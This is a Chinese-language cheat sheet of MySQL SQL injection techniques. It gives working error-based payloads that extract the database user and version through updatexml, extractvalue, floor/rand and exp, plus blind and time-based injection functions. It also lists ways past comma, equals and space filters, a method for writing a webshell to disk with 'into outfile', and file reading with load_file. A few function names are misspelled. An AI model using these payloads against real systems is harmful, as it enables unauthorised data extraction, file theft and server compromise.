## 绕过逗号过滤
在使用盲注的时候，需要使用到substr(),mid(),limit.这些字句方法都需要使用到逗号。都与substr和mid()这两个方法，可以使用from for的方式来解决
## insert 注入
insert注入一般为时间盲注，本身不存在bool盲注。
## mysql报错函数
### 通用的报错函数
geometrycollection() //在mysql 5.6/mariadb 10.1中测试无报错  
multipoint()         //在mysql 5.6/mariadb 10.1中测试无报错  
polygon()            //在mysql 5.6/mariadb 10.1中测试无报错  
multipolygon()       //在mysql 5.6/mariadb 10.1中测试无报错  
linestring()         //在mysql 5.6/mariadb 10.1中测试无报错  
mulilinestring()     //在mysql 5.6/mariadb 10.1中测试无报错  
floor()              //可用，select * from test where id=1 and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)));  
updatexml()          //可用，select * from test where 1 and updatexml(1,(select concat(0x7e,user())),1)  
extractvalue()       //可用，select * from test where id =1 and extractvalue(1,(select concat(0x7e,user())));  
exp()                //在mysql 5.6可用/mariadb 10.1中测试无报错，select * from test where i and exp(~(select * from(select user())a));  
### mysql5.7以上才有的报错函数
ST_LatFromGeoHash()
ST_LongFromGeoHash()
GTID_SUBSET()
ST_PointFromGeoHash()
## mysql中字符串拼接函数
left(str,length)           //从字符串左侧截取str的前length位
right(str,length)           //从字符串右侧截取
mid(str,pos,len)          //从pos位置开始，截取字符串str的len长度
substr(a,b,c)               //效果同mid
substring(str,pos)         //从pos位置开始，截取到最后
## mysql中基于时间的盲注函数
+ sleep
+ banchmark

## mysql写shell
+ select 'xxxx' into outfile '路径'
+ select 'xxxx' into dumpfile '路径'
mysql读文件：select load_file('路径');

## mysql udf提权

## mysql一些技巧
'='被过滤，可以用like代替
' '被过滤，可以用`/**/`,`/!**/`,%0a,%0b,'+'来尝试绕过
','被过滤，可以用join来绕过
